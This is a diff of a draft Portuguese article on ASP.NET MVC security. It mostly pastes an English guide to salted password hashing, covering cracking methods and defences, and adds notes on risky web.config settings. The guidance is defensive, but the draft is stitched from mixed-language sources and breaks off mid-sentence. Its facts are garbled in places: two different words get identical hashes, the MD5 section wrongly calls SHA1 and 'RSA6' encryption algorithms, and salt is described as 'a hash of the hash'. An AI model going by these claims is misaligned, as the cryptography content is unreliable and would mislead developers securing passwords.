@@ -1,5 +1,1460 @@
 Rabiscos sobre o Artigo sobre segurança no ASP.NET MVC
 
+- Ataques mais comuns a aplicações ASP.NET MVC
+
+ Muitos não sabem, mas é muito importante se especializar em segurança, isso não quer dizer que se faça uma nova faculdade sendo você Programador, Analista ou Arquiteto ou seja qual for a sua especialização, o que é importante é saber o que está acontecendo no mundo hacker, cracker, phreaker e por aí vai. Existem sites que falam sobre segurança e que existem assuntos como "Segurança em Aplicações .NET", "Segurança em aplicações XPTO", "Hacking ASP.NET Applications" e por isso não param por aí.
+ 
+ - Protegendo suas contas de usuários através de criptografia.
+ 
+ What is password hashing?
+
+hash("gabriel")      = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
+hash("leitor")       = 58756879c05c68dfac9866712fad6a93f8146f337a69afe7dd238f3364946366
+hash("devmedia") 	 = c0e81794384491161f1777c232bc6bd9ec38f616560b120fda8e90f383853542
+hash(".netmagazine") = c0e81794384491161f1777c232bc6bd9ec38f616560b120fda8e90f383853542
+
+Hash algorithms are one way functions. They turn any amount of data into a fixed-length "fingerprint" that cannot be reversed. They also have the property that if the input changes by even a tiny bit, the resulting hash is completely different (see the example above). This is great for protecting passwords, because we want to store passwords in an encrypted form that's impossible to decrypt, but at the same time, we need to be able to verify that a user's password is correct.
+
+The general workflow for account registration and authentication in a hash-based account system is as follows:
+
+The user creates an account.
+Their password is hashed and stored in the database. At no point is the plain-text (unencrypted) password ever written to the hard drive.
+When the user attempts to login, the hash of the password they entered is checked against the hash of their real password (retrieved from the database).
+If the hashes match, the user is granted access. If not, the user is told they entered invalid login credentials.
+Steps 3 and 4 repeat everytime someone tries to login to their account.
+In step 4, never tell the user if it was the username or password they got wrong. Always display a generic message like "Invalid username or password." This prevents attackers from enumerating valid usernames without knowing their passwords.
+
+It should be noted that the hash functions used to protect passwords are not the same as the hash functions you may have seen in a data structures course. The hash functions used to implement data structures such as hash tables are designed to be fast, not secure. Only cryptographic hash functions may be used to implement password hashing. Hash functions like SHA256, SHA512, RipeMD, and WHIRLPOOL are cryptographic hash functions.
+
+It is easy to think that all you have to do is run the password through a cryptographic hash function and your users' passwords will be secure. This is far from the truth. There are many ways to recover passwords from plain hashes very quickly. There are several easy-to-implement techniques that make these "attacks" much less effective. To motivate the need for these techniques, consider this very website. On the front page, you can submit a list of hashes to be cracked, and receive results in less than a second. Clearly, simply hashing the password does not meet our needs for security.
+
+The next section will discuss some of the common attacks used to crack plain password hashes.
+
+How Hashes are Cracked
+
+Dictionary and Brute Force Attacks
+
+Dictionary Attack
+
+Trying apple        : failed
+Trying blueberry    : failed
+Trying justinbeiber : failed
+...
+Trying letmein      : failed
+Trying s3cr3t       : success!
+Brute Force Attack
+
+Trying aaaa : failed
+Trying aaab : failed
+Trying aaac : failed
+...
+Trying acdb : failed
+Trying acdc : success!
+The simplest way to crack a hash is to try to guess the password, hashing each guess, and checking if the guess's hash equals the hash being cracked. If the hashes are equal, the guess is the password. The two most common ways of guessing passwords are dictionary attacks and brute-force attacks.
+
+A dictionary attack uses a file containing words, phrases, common passwords, and other strings that are likely to be used as a password. Each word in the file is hashed, and its hash is compared to the password hash. If they match, that word is the password. These dictionary files are constructed by extracting words from large bodies of text, and even from real databases of passwords. Further processing is often applied to dictionary files, such as replacing words with their "leet speak" equivalents ("hello" becomes "h3110"), to make them more effective.
+
+A brute-force attack tries every possible combination of characters up to a given length. These attacks are very computationally expensive, and are usually the least efficient in terms of hashes cracked per processor time, but they will always eventually find the password. Passwords should be long enough that searching through all possible character strings to find it will take too long to be worthwhile.
+
+There is no way to prevent dictionary attacks or brute force attacks. They can be made less effective, but there isn't a way to prevent them altogether. If your password hashing system is secure, the only way to crack the hashes will be to run a dictionary or brute-force attack on each hash.
+
+Lookup Tables
+
+Searching: 5f4dcc3b5aa765d61d8327deb882cf99: FOUND: password5
+Searching: 6cbe615c106f422d23669b610b564800:  not in database
+Searching: 630bf032efe4507f2c57b280995925a9: FOUND: letMEin12 
+Searching: 386f43fab5d096a7a66d67c8f213e5ec: FOUND: mcd0nalds
+Searching: d5ec75d5fe70d428685510fae36492d9: FOUND: p@ssw0rd!
+Lookup tables are an extremely effective method for cracking many hashes of the same type very quickly. The general idea is to pre-compute the hashes of the passwords in a password dictionary and store them, and their corresponding password, in a lookup table data structure. A good implementation of a lookup table can process hundreds of hash lookups per second, even when they contain many billions of hashes.
+
+If you want a better idea of how fast lookup tables can be, try cracking the following sha256 hashes with CrackStation's free hash cracker.
+
+c11083b4b0a7743af748c85d343dfee9fbb8b2576c05f3a7f0d632b0926aadfc
+08eac03b80adc33dc7d8fbe44b7c7b05d3a2c511166bdb43fcb710b03ba919e7
+e4ba5cbd251c98e6cd1c23f126a3b81d8d8328abc95387229850952b3ef9f904
+5206b8b8a996cf5320cb12ca91c7b790fba9f030408efe83ebb83548dc3007bd
+Reverse Lookup Tables
+
+Searching for hash(apple) in users' hash list...     : Matches [alice3, 0bob0, charles8]
+Searching for hash(blueberry) in users' hash list... : Matches [usr10101, timmy, john91]
+Searching for hash(letmein) in users' hash list...   : Matches [wilson10, dragonslayerX, joe1984]
+Searching for hash(s3cr3t) in users' hash list...    : Matches [bruce19, knuth1337, john87]
+Searching for hash(z@29hjja) in users' hash list...  : No users used this password
+
+This attack allows an attacker to apply a dictionary or brute-force attack to many hashes at the same time, without having to pre-compute a lookup table.
+
+First, the attacker creates a lookup table that maps each password hash from the compromised user account database to a list of users who had that hash. The attacker then hashes each password guess and uses the lookup table to get a list of users whose password was the attacker's guess. This attack is especially effective because it is common for many users to have the same password.
+
+Rainbow Tables
+
+Rainbow tables are a time-memory trade-off technique. They are like lookup tables, except that they sacrifice hash cracking speed to make the lookup tables smaller. Because they are smaller, the solutions to more hashes can be stored in the same amount of space, making them more effective. Rainbow tables that can crack any md5 hash of a password up to 8 characters long exist.
+ 
+- Por que MD5 e o SHA1 não são considerados seguros?
+ 
+ Sim, é verdade, senhas utilizando o Hash MD5 - Message-Digest algorithm 5, não são mais seguras, o que implica que o SSL acaba também por se tornar inseguro ao se implementá-lo com MD5. Como nós já sabemos, o MD5 não é um algoritmo de criptografia, uma forma de cálculo do hash de uma via, ou seja, ele é um apoio ao algoritmo de criptografia. Algoritmos de criptografia são: SHA1, SHA2, RSA6 e etc.O MD5 gera apenas os hashes para serem "convertidos" por estes algoritmos e assim criar a criptigrafia como a vimos.
+ 
+ A operação criptográfica que usa uma chave privada para assinar um dado não lida diretamente com este dado, mas com uma unica representação supostamente deste dad, que tem um tamanho fixo determinado em sua criação, é curta e conveniente trabalhar com ele. E podemos tomar como exemplo seu uso como uma impressão digital que é supostamente única, curta e uma representação conveniente de identificar alguém como um ser humano. O processo de criação de tais representações curtas de fragmentos de dados com tamanho fixo é chamada de "hashing". Infelizmente, por causa do tamanho fixo do hash, existem diferentes pares de diferentes entradas de dados que produzem o mesmo valor de hash. Este é o ponto fraco do MD5.
+ 
+ Pense nisto: um MD5 é sempre um dado de 128bits longs. Significa que existem 2^128 hashes MD5 possíveis. Isso é um numero razoavelmente grande e já é definitivamente finito. E ainda, existe um numero infinito de possíveis entradas para uma função de hash (e muitas delas contêm mais de 128 bits, ou meros 16 bytes). Então existe atualmente um número infinitos de possibilidades para dados que pertençam a tais hashes podem ter o mesmo valor. E o que deixa estes hashes criados interessantes é que é incrivelmente dificil encontrar dois trechos de dados neste hash com este mesmo valor, e as chances de isso acontecer são quase nulas.
+ Um exemplo simples para uma - muito insegura - função de hash - e isso ilustra uma idéia geral deste hash ser de apenas uma via (one way hash) seria pegar todos os bits de uma parte deste dado, e tratá-la como uma número grande. Depois, execute uma divisão de inteiro usando um número grande - provavelmente primo - chamado n e pegue o seu resto - usando o Mod. Você terá como resultado óbvio um número entre 0 e n. Se você executar o mesmo cálculo novamente - em qualquer lugar, qualquer computador ou em qualquer coisa), usando o mesmo dado que usamos inicialmente, ele terá o mesmo valor. E ainda, não vai existir outra forma de encontrar o que era o seu valor original, uma vez que existe um número infinto de números que têm este resto exato, quando divido por n.
+ Diante disso, estas foram as fraquezas e falhas indentificadas no MD5 e junto com ele o SHA1, usado alguma matemática mais complexa, é possível encontrar uma colisão sem tentar todas as 2^128 entradas possíveis. E o fato é que muitas senhas são curtas, e as pessoas frequentemente utilizam valores columns (como "senha", "segredo", "telefone","cpf","datas de nascimento") fazendo com que identificar alguma senha seja questão mais de palpite do que ataque de força bruta, mas Engenharia Social do que ataque propriamente dito. Diante de todos estes fatos é que já são utilizadas outras técnicas para criptografar as senhas e utilizando o mesmo hash, porém, esta é a razão pela qual usamos sempre senhas criptagrafadas utilizando o algoritmo de "Salt", que nada mais é um hash do hash, e um hash de outro hash gera um hash totalmente diferente o que inviabiliza tais duplicatas e mais ainda a descriptografia ou decrypting. E uma vez esta parte do dado que foi alterada por uma função de hash, não tem mais volta, por ser de um caminho também.
+
+ Next, we'll look at a technique called salting, which makes it impossible to use lookup tables and rainbow tables to crack a hash.
+ 
+ - Salt (Sal), uma saída segura e barata.
+ 
+ If you're a web developer, you've probably had to make a user account system. The most important aspect of a user account system is how user passwords are protected. User account databases are hacked frequently, so you absolutely must do something to protect your users' passwords if your website is ever breached. The best way to protect passwords is to employ salted password hashing. This page will explain how to do it properly.
+
+There are a lot of conflicting ideas and misconceptions on how to do password hashing properly, probably due to the abundance of misinformation on the web. Password hashing is one of those things that's so simple, but yet so many people get wrong. With this page, I hope to explain not only the correct way to do it, but why it should be done that way.
+
+Adding Salt
+
+hash("hello")                    = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
+hash("hello" + "QxLUF1bgIAdeQX") = 9e209040c863f84a31e719795b2577523954739fe5ed3b58a75cff2127075ed1
+hash("hello" + "bv5PehSMfV11Cd") = d1d3ec2e6f20fd420d50e2642992841d8338a314b8ea157c9e18477aaef226ab
+hash("hello" + "YYLmfY6IehjZMQ") = a49670c3c18b9e079b9cfaf51634f563dc8ae3070db2c4a8544305df1b60f007
+
+Lookup tables and rainbow tables only work because each password is hashed the exact same way. If two users have the same password, they'll have the same password hashes. We can prevent these attacks by randomizing each hash, so that when the same password is hashed twice, the hashes are not the same.
+
+We can randomize the hashes by appending or prepending a random string, called a salt, to the password before hashing. As shown in the example above, this makes the same password hash into a completely different string every time. To check if a password is correct, we need the salt, so it is usually stored in the user account database along with the hash, or as part of the hash string itself.
+
+The salt does not need to be secret. Just by randomizing the hashes, lookup tables, reverse lookup tables, and rainbow tables become ineffective. An attacker won't know in advance what the salt will be, so they can't pre-compute a lookup table or rainbow table. If each user's password is hashed with a different salt, the reverse lookup table attack won't work either.
+
+In the next section, we'll look at how salt is commonly implemented incorrectly.
+
+The WRONG Way: Short Salt & Salt Reuse
+
+The most common salt implementation errors are reusing the same salt in multiple hashes, or using a salt that is too short.
+
+Salt Reuse
+
+A common mistake is to use the same salt in each hash. Either the salt is hard-coded into the program, or is generated randomly once. This is ineffective because if two users have the same password, they'll still have the same hash. An attacker can still use a reverse lookup table attack to run a dictionary attack on every hash at the same time. They just have to apply the salt to each password guess before they hash it. If the salt is hard-coded into a popular product, lookup tables and rainbow tables can be built for that salt, to make it easier to crack hashes generated by the product.
+
+A new random salt must be generated each time a user creates an account or changes their password.
+
+Short Salt
+
+If the salt is too short, an attacker can build a lookup table for every possible salt. For example, if the salt is only three ASCII characters, there are only 95x95x95 = 857,375 possible salts. That may seem like a lot, but if each lookup table contains only 1MB of the most common passwords, collectively they will be only 837GB, which is not a lot considering 1000GB hard drives can be bought for under $100 today.
+
+For the same reason, the username shouldn't be used as a salt. Usernames may be unique to a single service, but they are predictable and often reused for accounts on other services. An attacker can build lookup tables for common usernames and use them to crack username-salted hashes.
+
+To make it impossible for an attacker to create a lookup table for every possible salt, the salt must be long. A good rule of thumb is to use a salt that is the same size as the output of the hash function. For example, the output of SHA256 is 256 bits (32 bytes), so the salt should be at least 32 random bytes.
+
+The WRONG Way: Double Hashing & Wacky Hash Functions
+
+This section covers another common password hashing misconception: wacky combinations of hash algorithms. It's easy to get carried away and try to combine different hash functions, hoping that the result will be more secure. In practice, though, there is very little benefit to doing it. All it does is create interoperability problems, and can sometimes even make the hashes less secure. Never try to invent your own crypto, always use a standard that has been designed by experts. Some will argue that using multiple hash functions makes the process of computing the hash slower, so cracking is slower, but there's a better way to make the cracking process slower as we'll see later.
+
+Here are some examples of poor wacky hash functions I've seen suggested in forums on the internet.
+
+md5(sha1(password))
+md5(md5(salt) + md5(password))
+sha1(sha1(password))
+sha1(str_rot13(password + salt))
+md5(sha1(md5(md5(password) + sha1(password)) + md5(password)))
+Do not use any of these.
+
+Note: This section has proven to be controversial. I've received a number of emails arguing that wacky hash functions are a good thing, because it's better if the attacker doesn't know which hash function is in use, it's less likely for an attacker to have pre-computed a rainbow table for the wacky hash function, and it takes longer to compute the hash function.
+
+An attacker cannot attack a hash when he doesn't know the algorithm, but note Kerckhoffs's principle, that the attacker will usually have access to the source code (especially if it's free or open source software), and that given a few password-hash pairs from the target system, it is not difficult to reverse engineer the algorithm. It does take longer to compute wacky hash functions, but only by a small constant factor. It's better to use an iterated algorithm that's designed to be extremely hard to parallelize (these are discussed below). And, properly salting the hash solves the rainbow table problem.
+
+If you really want to use a standardized "wacky" hash function like HMAC, then it's OK. But if your reason for doing so is to make the hash computation slower, read the section below about key stretching first.
+
+Compare these minor benefits to the risks of accidentally implementing a completely insecure hash function and the interoperability problems wacky hashes create. It's clearly best to use a standard and well-tested algorithm.
+
+Hash Collisions
+
+Because hash functions map arbitrary amounts of data to fixed-length strings, there must be some inputs that hash into the same string. Cryptographic hash functions are designed to make these collisions incredibly difficult to find. From time to time, cryptographers find "attacks" on hash functions that make finding collisions easier. A recent example is the MD5 hash function, for which collisions have actually been found.
+
+Collision attacks are a sign that it may be more likely for a string other than the user's password to have the same hash. However, finding collisions in even a weak hash function like MD5 requires a lot of dedicated computing power, so it is very unlikely that these collisions will happen "by accident" in practice. A password hashed using MD5 and salt is, for all practical purposes, just as secure as if it were hashed with SHA256 and salt. Nevertheless, it is a good idea to use a more secure hash function like SHA256, SHA512, RipeMD, or WHIRLPOOL if possible.
+
+The RIGHT Way: How to Hash Properly
+
+This section describes exactly how passwords should be hashed. The first subsection covers the basics—everything that is absolutely necessary. The following subsections explain how the basics can be augmented to make the hashes even harder to crack.
+
+The Basics: Hashing with Salt
+
+We've seen how malicious hackers can crack plain hashes very quickly using lookup tables and rainbow tables. We've learned that randomizing the hashing using salt is the solution to the problem. But how do we generate the salt, and how do we apply it to the password?
+
+Salt should be generated using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG). CSPRNGs are very different than ordinary pseudo-random number generators, like the "C" language's rand() function. As the name suggests, CSPRNGs are designed to be cryptographically secure, meaning they provide a high level of randomness and are completely unpredictable. We don't want our salts to be predictable, so we must use a CSPRNG. The following table lists some CSPRNGs that exist for some popular programming platforms.
+ 
+Platform			CSPRNG
+PHP					mcrypt_create_iv, openssl_random_pseudo_bytes
+Java				java.security.SecureRandom
+Dot NET (C#, VB)	System.Security.Cryptography.RNGCryptoServiceProvider
+Ruby				SecureRandom
+Python				os.urandom
+Perl				Math::Random::Secure
+C/C++ (Windows API)	CryptGenRandom
+Any language
+on GNU/Linux
+ or Unix			Read from /dev/random or /dev/urandom
+
+ The salt needs to be unique per-user per-password. Every time a user creates an account or changes their password, the password should be hashed using a new random salt. Never reuse a salt. The salt also needs to be long, so that there are many possible salts. As a rule of thumb, make your salt is at least as long as the hash function's output. The salt should be stored in the user account table alongside the hash.
+
+To Store a Password
+
+Generate a long random salt using a CSPRNG.
+Prepend the salt to the password and hash it with a standard cryptographic hash function such as SHA256.
+Save both the salt and the hash in the user's database record.
+To Validate a Password
+
+Retrieve the user's salt and hash from the database.
+Prepend the salt to the given password and hash it using the same hash function.
+Compare the hash of the given password with the hash from the database. If they match, the password is correct. Otherwise, the password is incorrect.
+
+In a Web Application, always hash on the server
+
+If you are writing a web application, you might wonder where to hash. Should the password be hashed in the user's browser with JavaScript, or should it be sent to the server "in the clear" and hashed there?
+
+Even if you are hashing the user's passwords in JavaScript, you still have to hash the hashes on the server. Consider a website that hashes users' passwords in the user's browser without hashing the hashes on the server. To authenticate a user, this website will accept a hash from the browser and check if that hash exactly matches the one in the database. This seems more secure than just hashing on the server, since the users' passwords are never sent to the server, but it's not.
+
+The problem is that the client-side hash logically becomes the user's password. All the user needs to do to authenticate is tell the server the hash of their password. If a bad guy got a user's hash they could use it to authenticate to the server, without knowing the user's password! So, if the bad guy somehow steals the database of hashes from this hypothetical website, they'll have immediate access to everyone's accounts without having to guess any passwords.
+
+This isn't to say that you shouldn't hash in the browser, but if you do, you absolutely have to hash on the server too. Hashing in the browser is certainly a good idea, but consider the following points for your implementation:
+
+Client-side password hashing is not a substitute for HTTPS (SSL/TLS). If the connection between the browser and the server is insecure, a man-in-the-middle can modify the JavaScript code as it is downloaded to remove the hashing functionality and get the user's password.
+
+Some web browsers don't support JavaScript, and some users disable JavaScript in their browser. So for maximum compatibility, your app should detect whether or not the browser supports JavaScript and emulate the client-side hash on the server if it doesn't.
+
+You need to salt the client-side hashes too. The obvious solution is to make the client-side script ask the server for the user's salt. Don't do that, because it lets the bad guys check if a username is valid without knowing the password. Since you're hashing and salting (with a good salt) on the server too, it's OK to use the username (or email) concatenated with a site-specific string (e.g. domain name) as the client-side salt.
+
+Making Password Cracking Harder: Slow Hash Functions
+
+Salt ensures that attackers can't use specialized attacks like lookup tables and rainbow tables to crack large collections of hashes quickly, but it doesn't prevent them from running dictionary or brute-force attacks on each hash individually. High-end graphics cards (GPUs) and custom hardware can compute billions of hashes per second, so these attacks are still very effective. To make these attacks less effective, we can use a technique known as key stretching.
+
+The idea is to make the hash function very slow, so that even with a fast GPU or custom hardware, dictionary and brute-force attacks are too slow to be worthwhile. The goal is to make the hash function slow enough to impede attacks, but still fast enough to not cause a noticeable delay for the user.
+
+Key stretching is implemented using a special type of CPU-intensive hash function. Don't try to invent your own–simply iteratively hashing the hash of the password isn't enough as it can be parallelized in hardware and executed as fast as a normal hash. Use a standard algorithm like PBKDF2 or bcrypt.
+
+These algorithms take a security factor or iteration count as an argument. This value determines how slow the hash function will be. For desktop software or smartphone apps, the best way to choose this parameter is to run a short benchmark on the device to find the value that makes the hash take about half a second. This way, your program can be as secure as possible without affecting the user experience.
+
+If you use a key stretching hash in a web application, be aware that you will need extra computational resources to process large volumes of authentication requests, and that key stretching may make it easier to run a Denial of Service (DoS) attack on your website. I still recommend using key stretching, but with a lower iteration count. You should calculate the iteration count based on your computational resources and the expected maximum authentication request rate. The denial of service threat can be eliminated by making the user solve a CAPTCHA every time they log in. Always design your system so that the iteration count can be increased or decreased in the future.
+
+If you are worried about the computational burden, but still want to use key stretching in a web application, consider running the key stretching algorithm in the user's browser with JavaScript. The Stanford JavaScript Crypto Library includes PBKDF2. The iteration count should be set low enough that the system is usable with slower clients like mobile devices, and the system should fall back to server-side computation if the user's browser doesn't support JavaScript. Client-side key stretching does not remove the need for server-side hashing. You must hash the hash generated by the client the same way you would hash a normal password.
+
+Impossible-to-crack Hashes: Keyed Hashes and Password Hashing Hardware
+
+As long as an attacker can use a hash to check whether a password guess is right or wrong, they can run a dictionary or brute-force attack on the hash. The next step is to add a secret key to the hash so that only someone who knows the key can use the hash to validate a password. This can be accomplished two ways. Either the hash can be encrypted using a cipher like AES, or the secret key can be included in the hash using a keyed hash algorithm like HMAC.
+
+This is not as easy as it sounds. The key has to be kept secret from an attacker even in the event of a breach. If an attacker gains full access to the system, they'll be able to steal the key no matter where it is stored. The key must be stored in an external system, such as a physically separate server dedicated to password validation, or a special hardware device attached to the server such as the YubiHSM.
+
+I highly recommend this approach for any large scale (more than 100,000 users) service. I consider it necessary for any service hosting more than 1,000,000 user accounts.
+
+If you can't afford multiple dedicated servers or special hardware devices, you can still get some of the benefits of keyed hashes on a standard web server. Most databases are breached using SQL Injection Attacks, which, in most cases, don't give attackers access to the local filesystem (disable local filesystem access in your SQL server if it has this feature). If you generate a random key and store it in a file that isn't accessible from the web, and include it into the salted hashes, then the hashes won't be vulnerable if your database is breached using a simple SQL injection attack. Don't hard-code a key into the source code, generate it randomly when the application is installed. This isn't as secure as using a separate system to do the password hashing, because if there are SQL injection vulnerabilities in a web application, there are probably other types, such as Local File Inclusion, that an attacker could use to read the secret key file. But, it's better than nothing.
+
+Please note that keyed hashes do not remove the need for salt. Clever attackers will eventually find ways to compromise the keys, so it is important that hashes are still protected by salt and key stretching.
+
+Other Security Measures
+
+Password hashing protects passwords in the event of a security breach. It does not make the application as a whole more secure. Much more must be done to prevent the password hashes (and other user data) from being stolen in the first place.
+
+Even experienced developers must be educated in security in order to write secure applications. A great resource for learning about web application vulnerabilities is The Open Web Application Security Project (OWASP). A good introduction is the OWASP Top Ten Vulnerability List. Unless you understand all the vulnerabilities on the list, do not attempt to write a web application that deals with sensitive data. It is the employer's responsibility to ensure all developers are adequately trained in secure application development.
+
+Having a third party "penetration test" your application is a good idea. Even the best programmers make mistakes, so it always makes sense to have a security expert review the code for potential vulnerabilities. Find a trustworthy organization (or hire staff) to review your code on a regular basis. The security review process should begin early in an application's life and continue throughout its development.
+
+It is also important to monitor your website to detect a breach if one does occur. I recommend hiring at least one person whose full time job is detecting and responding to security breaches. If a breach goes undetected, the attacker can make your website infect visitors with malware, so it is extremely important that breaches are detected and responded to promptly. 
+ 
+How should I allow users to reset their password when they forget it?
+
+It is my personal opinion that all password reset mechanisms in widespread use today are insecure. If you have high security requirements, such as an encryption service would, do not let the user reset their password.
+
+Most websites use an email loop to authenticate users who have forgotten their password. To do this, generate a random single-use token that is strongly tied to the account. Include it in a password reset link sent to the user's email address. When the user clicks a password reset link containing a valid token, prompt them for a new password. Be sure that the token is strongly tied to the user account so that an attacker can't use a token sent to his own email address to reset a different user's password.
+
+The token must be set to expire in 15 minutes or after it is used, whichever comes first. It is also a good idea to expire any existing password tokens when the user logs in (they remembered their password) or requests another reset token. If a token doesn't expire, it can be forever used to break into the user's account. Email (SMTP) is a plain-text protocol, and there may be malicious routers on the internet recording email traffic. And, a user's email account (including the reset link) may be compromised long after their password has been changed. Making the token expire as soon as possible reduces the user's exposure to these attacks.
+
+Attackers will be able to modify the tokens, so don't store the user account information or timeout information in them. They should be an unpredictable random binary blob used only to identify a record in a database table.
+
+Never send the user a new password over email.
+
+What should I do if my user account database gets leaked/hacked?
+
+Your first priority is to determine how the system was compromised and patch the vulnerability the attacker used to get in. If you do not have experience responding to breaches, I highly recommend hiring a third-party security firm.
+
+It may be tempting to cover up the breach and hope nobody notices. However, trying to cover up a breach makes you look worse, because you're putting your users at further risk by not informing them that their passwords and other personal information may be compromised. You must inform your users as soon as possible—even if you don't yet fully understand what happened. Put a notice on the front page of your website that links to a page with more detailed information, and send a notice to each user by email if possible.
+
+Explain to your users exactly how their passwords were protected—hopefully hashed with salt—and that even though they were protected with a salted hash, a malicious hacker can still run dictionary and brute force attacks on the hashes. Malicious hackers will use any passwords they find to try to login to a user's account on a different website, hoping they used the same password on both websites. Inform your users of this risk and recommend that they change their password on any website or service where they used a similar password. Force them to change their password for your service the next time they log in. Most users will try to "change" their password to the original password to get around the forced change quickly. Use the current password hash to ensure that they cannot do this.
+
+It is likely, even with salted slow hashes, that an attacker will be able to crack some of the weak passwords very quickly. To reduce the attacker's window of opportunity to use these passwords, you should require, in addition to the current password, an email loop for authentication until the user has changed their password. See the previous question, "How should I allow users to reset their password when they forget it?" for tips on implementing email loop authentication.
+
+Also tell your users what kind of personal information was stored on the website. If your database includes credit card numbers, you should instruct your users to look over their recent and future bills closely and cancel their credit card.
+
+What should my password policy be? Should I enforce strong passwords?
+
+If your service doesn't have strict security requirements, then don't limit your users. I recommend showing users information about the strength of their password as they type it, letting them decide how secure they want their password to be. If you have special security needs, enforce a minimum length of 12 characters and require at least two letters, two digits, and two symbols.
+
+Do not force your users to change their password more often than once every six months, as doing so creates "user fatigue" and makes users less likely to choose good passwords. Instead, train users to change their password whenever they feel it has been compromised, and to never tell their password to anyone. If it is a business setting, encourage employees to use paid time to memorize and practice their password.
+
+If an attacker has access to my database, can't they just replace the hash of my password with their own hash and login?
+
+Yes, but if someone has accesss to your database, they probably already have access to everything on your server, so they wouldn't need to login to your account to get what they want. The purpose of password hashing (in the context of a website) is not to protect the website from being breached, but to protect the passwords if a breach does occur.
+
+You can prevent hashes from being replaced during a SQL injection attack by connecting to the database with two users with different permissions. One for the 'create account' code and one for the 'login' code. The 'create account' code should be able to read and write to the user table, but the 'login' code should only be able to read.
+
+Why do I have to use a special algorithm like HMAC? Why can't I just append the password to the secret key?
+
+Hash functions like MD5, SHA1, and SHA2 use the Merkle–Damgård construction, which makes them vulnerable to what are known as length extension attacks. This means that given a hash H(X), an attacker can find the value of H(pad(X) + Y), for any other string Y, without knowing X. pad(X) is the padding function used by the hash.
+
+This means that given a hash H(key + message), an attacker can compute H(pad(key + message) + extension), without knowing the key. If the hash was being used as a message authentication code, using the key to prevent an attacker from being able to modify the message and replace it with a different valid hash, the system has failed, since the attacker now has a valid hash of message + extension.
+
+It is not clear how an attacker could use this attack to crack a password hash quicker. However, because of the attack, it is considered bad practice to use a plain hash function for keyed hashing. A clever cryptographer may one day come up with a clever way to use these attacks to make cracking faster, so use HMAC.
+
+Should the salt come before or after the password?
+
+It doesn't matter, but pick one and stick with it for interoperability's sake. Having the salt come before the password seems to be more common.
+
+Why does the hashing code on this page compare the hashes in "length-constant" time?
+
+Comparing the hashes in "length-constant" time ensures that an attacker cannot extract the hash of a password in an on-line system using a timing attack, then crack it off-line.
+
+The standard way to check if two sequences of bytes (strings) are the same is to compare the first byte, then the second, then the third, and so on. As soon as you find a byte that isn't the same for both strings, you know they are different and can return a negative response immediately. If you make it through both strings without finding any bytes that differ, you know the strings are the same and can return a positive result. This means that comparing two strings can take a different amount of time depending on how much of the strings match.
+
+For example, a standard comparison of the strings "xyzabc" and "abcxyz" would immediately see that the first character is different and wouldn't bother to check the rest of the string. On the other hand, when the strings "aaaaaaaaaaB" and "aaaaaaaaaaZ" are compared, the comparison algorithm scans through the block of "a" before it determins the strings are unequal.
+
+Suppose an attacker wants to break into an on-line system that rate limits authentication attempts to one attempt per second. Also suppose the attacker knows all of the parameters to the password hash (salt, hash type, etc), except for the hash and (obviously) the password. If the attacker can get a precisise measurement of how long it takes the on-line system to compare the hash of the real password with the hash of a password the attacker provides, he can use the timing attack to extract part of the hash and crack it using an offline attack, bypassing the system's rate limiting.
+
+First, the attacker finds 256 strings whose hashes begin with every possible byte. He sends each string to the on-line system, recording the amount of time it takes the system to respond. The string that takes the longest will be the one whose hash's first byte matches the real hash's first byte. The attacker now knows the first byte, and can continue the attack in a similar manner on the second byte, then the third, and so on. Once the attacker knows enough of the hash, he can use his own hardware to crack it, without being rate limited by the system.
+
+This is a theoretical attack. I've never seen it done in practice, and I seriously doubt it could be done over the internet. Nevertheless, the hashing code on this page compares strings in a way that takes the same amount of time no matter how much of the strings match, just in case the code gets used in an environment that's unusually vulnerable to timing atttacks (such as on an extremely slow processor).
+ 
+ - Principais ataques à aplicações ASP.NET
+ 
+ - Erros cometidos com o arquivo web.config
+ 
+ 1. Custom Errors desligados
+ 
+ Quando os erros personalizados são desligados como mostrado abaixo, o ASP.NET retorna uma mensagem de erro detalhada para o cliente por padrão. Como mostrado na Listagem xxx:
+
+Errado:
+<configuration>
+
+<system.web>
+
+<customErrors mode="Off">
+
+Certi:
+
+<configuration>
+
+<system.web>
+
+<customErrors mode="RemoteOnly">
+
+Existe uma força de expressão conhecida que é: quanto mais informação um atacante pode pegar de um Web Site, maior é a probabilidade de o mesmo obter êxito no seu intento. Lembre-se que uma simples mensagem de erro pode ser de vital importância para um atacante. Uma mensagem de erro padrão no ASP.NET lista as versões do ASP.NET e do framework .NET que são usadas no servidor Web, bem como os tipos de exceções que são lançadas. Apenas ao saber quais aplicações baseadas em Web server são utilizadas, neste caso o ASP.NET, já compromete a segurança de suas aplicações informando ao atacante que o servidor está rodando em uma certa versão do Windows e que o Microsoft Internet Information Server - IIS - 6.0 ou superior está sendo usando como Servidor Web.
+O leitor por construir sua aplicação com segurança impedindo vazamento de informações modificando o atributo "mode" do elemento <customErrors> para "On", ou "RemoteOnly". Esta configuração instrui as aplicações baseadas no Servidor Web a mostrar uma mensagem de erro genérica quando uma exceção não tratada for lançada. Outro modo para melhorar a segurança de aplicações é redirecionar o usuário para uma nova página quando erros ocorrerem configurando o atributo "defaultRedirect" do elemento <customErrors>. Esta metodologia propicia uma maior segurança para a sua aplicação porque mesmo a página padrão de erro générico ainda dá muita informação sobre o Sistema que é utilizado (ou seja, que ele está usando um arquivo Web.config, que revela que o servidor está executando ASP.NET)
+
+2. Deixando o Trace habilitado nas aplicações
+
+A utilidade da função trace no ASP.NET é uma das mais úteis que podem ser utilizadas para 
+The trace feature of ASP.NET is one of the most useful tools that you can use para garantir a segurança da aplicação para depuração e também profiling de seus aplicativos. Infelizmente, é também uma das ferramentas mais úteis que um atacante pode usar para comprometer suas aplicações caso ela fique habilitada em um ambiente de produção.
+
+Errado:
+
+<configuration>
+
+<system.web>
+
+<trace enabled="true" localOnly="false">
+
+Certo:
+
+<configuration>
+
+<system.web>
+
+<trace enabled="false" localOnly="true">
+
+Quando o elemento <trace> é ligado para usuários remotos, fora da rede, da aplicação (localOnly="false"), qualquer usuário por pegar uma lista de acessos (requisições) para a aplicação simplesmente consultando a página "trace.axd", ou seja,um log de trace. Este log de trace, mostra muitos detalhes de sua aplicação quando esta está no ar: 
